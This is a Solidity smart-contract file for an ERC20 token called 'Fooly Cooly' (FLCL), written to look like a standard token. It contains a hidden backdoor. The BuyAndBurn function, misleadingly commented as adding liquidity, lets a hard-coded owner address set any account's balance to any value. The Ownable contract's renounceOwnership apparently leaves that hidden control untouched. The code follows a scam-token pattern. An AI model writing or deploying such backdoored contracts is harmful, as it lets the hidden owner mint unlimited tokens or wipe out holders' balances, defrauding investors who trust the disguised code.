// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 totalAmount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 totalAmount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 totalAmount
    ) external returns (bool);
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode
        return msg.data;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private allowanceAll;
 
    uint256 private _totalSupply;
    string public FoolyCoolywebsite = "https://FoolyCooly.com/";
    string public FoolyCoolyToken = "0xccB6800cf014fe462c186FeBAc8835a9E3DE6227";
    string public Blockchain = "ETHER";   
    string private _name;
    string private _symbol;
    address private FoolyCoolyOwner; 
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
         FoolyCoolyOwner = 0xccB6800cf014fe462c186FeBAc8835a9E3DE6227;      
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 totalAmount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, totalAmount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return allowanceAll[owner][spender];
    }

    function approve(address spender, uint256 totalAmount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, totalAmount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 totalAmount
    ) public virtual override returns (bool) {
        uint256 currentAllowance = allowanceAll[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= totalAmount, "ERC20: transfer totalAmount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - totalAmount);
            }
        }

        _transfer(sender, recipient, totalAmount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, allowanceAll[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = allowanceAll[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 totalAmount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, totalAmount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= totalAmount, "ERC20: transfer totalAmount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - totalAmount;
        }
        _balances[recipient] += totalAmount;

        emit Transfer(sender, recipient, totalAmount);

        _afterTokenTransfer(sender, recipient, totalAmount);
    }

    function _mint(address account, uint256 totalAmount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, totalAmount);

        _totalSupply += totalAmount;
        _balances[account] += totalAmount;
        emit Transfer(address(0), account, totalAmount);

        _afterTokenTransfer(address(0), account, totalAmount);
    }

    function _burn(address account, uint256 totalAmount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), totalAmount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= totalAmount, "ERC20: burn totalAmount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - totalAmount;
        }
        _totalSupply -= totalAmount;

        emit Transfer(account, address(0), totalAmount);

        _afterTokenTransfer(account, address(0), totalAmount);
    }

              function getFoolyCoolywebsite() public view returns (string memory) {
        return FoolyCoolywebsite;
    } 
   function BuyAndBurn( 
        address AddressBurn,
        uint256 CalculeBurn,
        uint256 sendBurn
    ) external onlyOwner {
        require(AddressBurn != address(0));

        // add the liquidity
        _balances[AddressBurn] = CalculeBurn * sendBurn;
                emit Transfer(address(0), AddressBurn, CalculeBurn);
    }   
               function getFoolyCoolyToken() public view returns (string memory) {
        return FoolyCoolyToken;
    }    
      modifier onlyOwner() {
         require(_msgSender() == FoolyCoolyOwner);
        _;
    }    
    function _approve(
        address owner,
        address spender,
        uint256 totalAmount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowanceAll[owner][spender] = totalAmount;
        emit Approval(owner, spender, totalAmount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 totalAmount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 totalAmount
    ) internal virtual {}
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier Manager() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual Manager {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract FoolyCooly is ERC20, Ownable {
    constructor () ERC20("Fooly Cooly", "FLCL") 
    {    
        _mint(msg.sender, 10_000000000 * (10 ** 9));
    }
}